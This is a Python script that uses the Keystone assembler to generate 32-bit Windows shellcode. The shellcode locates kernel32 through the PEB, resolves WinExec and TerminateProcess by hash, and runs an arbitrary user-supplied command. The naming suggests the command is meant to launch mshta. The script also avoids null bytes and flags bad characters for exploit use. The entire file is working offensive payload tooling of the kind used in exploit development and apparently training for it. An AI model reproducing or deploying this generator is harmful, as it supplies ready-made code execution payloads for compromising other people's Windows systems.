from keystone import *
from colorama import Fore, Style, init

init(autoreset=True)  # Initialize colorama

class ShellcodeGenerator:
    def __init__(self, command_to_convert, bad_characters):
        self.command_to_convert = command_to_convert
        self.bad_characters = bad_characters.split(",")
        self.encoded_command = ""
        self.shellcode = ""

    
    def convert_value_to_hex_and_little_endian(self):
        command = self.command_to_convert
        if len(command) % 4 != 0:
            padding_length = 4 - (len(command) % 4)
            command += '\x00' * padding_length
        results = []
        for i in range(0, len(command), 4):
            chunk = command[i:i + 4]
            hex_str = ''.join([f"{ord(c):02x}" for c in chunk])
            little_endian = ''.join(reversed([hex_str[i:i + 2] for i in range(0, len(hex_str), 2)]))
            results.append(f"push 0x{little_endian};")

        self.encoded_command = "\n".join(results[::-1])
        return self.encoded_command
    
    def check_badchars(self, shellcode):
        for index, byte in enumerate(shellcode.split("\\x")[1:]):  # Skipping the first empty entry
            if byte in self.bad_characters:
                print(Fore.RED + f"[!] Badchar \\x{byte} detected at Index {index}")
    
    def generate_shellcode(self):
        mshta_command = self.convert_value_to_hex_and_little_endian()
        CODE = (
                    " start:                             "  #
                    #"   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
                    "   mov   ebp, esp                  ;"  #
                    "   add   esp, 0xfffff9f0           ;"  #   Avoid NULL bytes

                    " find_kernel32:                     "  #
                    "   xor   ecx, ecx                  ;"  #   ECX = 0
                    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
                    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
                    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder

                    " next_module:                       "  #
                    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
                    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
                    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
                    "   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00 ?
                    "   jne   next_module               ;"  #   No: try next module

                    " find_function_shorten:             "  #
                    "   jmp find_function_shorten_bnc   ;"  #   Short jump

                    " find_function_ret:                 "  #
                    "   pop esi                         ;"  #   POP the return address from the stack
                    "   mov   [ebp+0x04], esi           ;"  #   Save find_function address for later usage
                    "   jmp resolve_symbols_kernel32    ;"  #

                    " find_function_shorten_bnc:         "  #   
                    "   call find_function_ret          ;"  #   Relative CALL with negative offset

                    " find_function:                     "  #
                    "   pushad                          ;"  #   Save all registers
                                                            #   Base address of kernel32 is in EBX from 
                                                            #   Previous step (find_kernel32)
                    "   mov   eax, [ebx+0x3c]           ;"  #   Offset to PE Signature
                    "   mov   edi, [ebx+eax+0x78]       ;"  #   Export Table Directory RVA
                    "   add   edi, ebx                  ;"  #   Export Table Directory VMA
                    "   mov   ecx, [edi+0x18]           ;"  #   NumberOfNames
                    "   mov   eax, [edi+0x20]           ;"  #   AddressOfNames RVA
                    "   add   eax, ebx                  ;"  #   AddressOfNames VMA
                    "   mov   [ebp-4], eax              ;"  #   Save AddressOfNames VMA for later

                    " find_function_loop:                "  #
                    "   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0
                    "   dec   ecx                       ;"  #   Decrement our names counter
                    "   mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA
                    "   mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name
                    "   add   esi, ebx                  ;"  #   Set ESI to the VMA of the current symbol name

                    " compute_hash:                      "  #
                    "   xor   eax, eax                  ;"  #   NULL EAX
                    "   cdq                             ;"  #   NULL EDX
                    "   cld                             ;"  #   Clear direction

                    " compute_hash_again:                "  #
                    "   lodsb                           ;"  #   Load the next byte from esi into al
                    "   test  al, al                    ;"  #   Check for NULL terminator
                    "   jz    compute_hash_finished     ;"  #   If the ZF is set, we've hit the NULL term
                    "   ror   edx, 0x0d                 ;"  #   Rotate edx 13 bits to the right
                    "   add   edx, eax                  ;"  #   Add the new byte to the accumulator
                    "   jmp   compute_hash_again        ;"  #   Next iteration

                    " compute_hash_finished:             "  #

                    " find_function_compare:             "  #
                    "   cmp   edx, [esp+0x24]           ;"  #   Compare the computed hash with the requested hash
                    "   jnz   find_function_loop        ;"  #   If it doesn't match go back to find_function_loop
                    "   mov   edx, [edi+0x24]           ;"  #   AddressOfNameOrdinals RVA
                    "   add   edx, ebx                  ;"  #   AddressOfNameOrdinals VMA
                    "   mov   cx,  [edx+2*ecx]          ;"  #   Extrapolate the function's ordinal
                    "   mov   edx, [edi+0x1c]           ;"  #   AddressOfFunctions RVA
                    "   add   edx, ebx                  ;"  #   AddressOfFunctions VMA
                    "   mov   eax, [edx+4*ecx]          ;"  #   Get the function RVA
                    "   add   eax, ebx                  ;"  #   Get the function VMA
                    "   mov   [esp+0x1c], eax           ;"  #   Overwrite stack version of eax from pushad

                    " find_function_finished:            "  #
                    "   popad                           ;"  #   Restore registers
                    "   ret                             ;"  #



                    " resolve_symbols_kernel32:          "  #
                    "   push  0xe8afe98                 ;"  #  Winexec hash
                    "   call  find_function             ;"  #   Find the WinExec function. Stored in EAX
                    "   mov   [ebp+0x12], eax           ;"  #   Save WinExec address for later usage

                    "   push  0x78b5b983                ;"  #   TerminateProcess hash
                    "   call  find_function             ;"  #   Find the TerminateProcess function. Stored in EAX
                    "   mov   [ebp+0x16], eax           ;"  #   Save TerminateProcess address for later usage



                    #" int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
                    " create_hta:                       "  #
                    "   xor ecx, ecx                    ;"  #   ecx = 0
                    "   push  ecx                       ;"  #   Push 0
                    )+mshta_command+(
                    "   push  esp                       ;"  #   Push pointer
                    "   pop   ebx                       ;"  #   Store pointer



                    " WinExec:                           "
                    "   xor ecx, ecx                    ;"  # ecx = 0

                    # WinExec(LPCSTR lpCmdLine ; UINT uCmdShow)
                    # WinExec(command; 0)
                    "   push ecx                        ;"  # NULL
                    "   push ebx                        ;"  # mshta.exe

                    "   call dword ptr [ebp+0x12]       ;"  # Call winexec


                

                    " terminate_process:                 "  #

                    "   xor   ecx, ecx                  ;"  #   NULL ECX
                    "   push  ecx                       ;"  #   uExitCode
                    "   push  0xffffffff                ;"  #   hProcess
                    "   call dword ptr [ebp+0x16]       ;"  #   Call TerminateProcess API

        )
        try:
            ks = Ks(KS_ARCH_X86, KS_MODE_32)
            encoding, count = ks.asm(CODE)
            shellcode = "".join([f"\\x{byte:02x}" for byte in encoding])
            self.shellcode = shellcode
            print(Fore.GREEN + f"[+] Shellcode: shellcode = b\"{self.shellcode}\"")
            print(Fore.GREEN + f"[+] Shellcode length: {len(encoding)} bytes")
            self.check_badchars(shellcode)
        except KsError as e:
            print(f"Error assembling shellcode: {e}")

# Example usage
command_to_convert = input("[+] Command to convert: ")
bad_characters = input("[+] the badchars: ")
generator = ShellcodeGenerator(command_to_convert, bad_characters)
generator.generate_shellcode()